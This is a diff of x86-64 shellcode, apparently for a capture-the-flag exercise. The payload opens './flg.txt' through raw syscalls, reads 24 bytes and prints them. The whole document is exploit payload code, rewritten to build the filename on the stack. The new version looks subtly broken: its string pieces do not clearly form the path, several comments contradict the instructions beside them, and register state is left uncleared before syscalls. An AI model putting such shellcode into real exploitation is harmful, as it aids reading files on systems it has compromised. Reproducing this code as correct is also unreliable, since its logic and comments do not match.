@@ -1,26 +1,28 @@
-global _start
-
 section .text
 _start:
     ; push './flg.txt\x00'
-    push 0x7478742E6C662F2E  ; "./flg.txt" en hexadecimal (8 bytes)
+    xor sil,sil
+    push si
+    mov dil, 't'
+    push di               ; push NULL string terminator
+    mov rdi, '/flg.tx' 
+    push rdi
 
+    
     ; open('rsp', 'O_RDONLY')
-    mov rdi, rsp         ; 3 bytes (48 89 E7)
-    mov al, 2            ; 2 bytes (B0 02) -> 'open' syscall
-    xor esi, esi         ; 2 bytes (31 F6)
+    mov al, 2          ; open syscall number
+    mov rdi, rsp        ; move pointer to filename
     syscall
 
     ; read file
-    mov edi, eax         ; 2 bytes (89 C7) -> fd devuelto por 'open'
-    xor eax, eax         ; 2 bytes (31 C0) -> 'read' syscall
-    mov rsi, rsp         ; 3 bytes (48 89 E6)
-    mov dl, 24           ; 2 bytes (B2 18)
+    lea rsi, [rdi]      ; pointer to opened file
+    mov rdi, rax        ; set fd to rax from open syscall
+    xor al, al          ; read syscall number
+    mov dl, 24         ; size to read
     syscall
 
     ; write output
-    mov edi, 1           ; 2 bytes (BF 01)
-    mov al, 1            ; 2 bytes (B0 01) -> 'write' syscall
+    mov al, 1          ; write syscall
+    mov dil, 1          ; set fd to stdout
+    mov dl, 24         ; size to read
     syscall
-
-    ; exit retirado
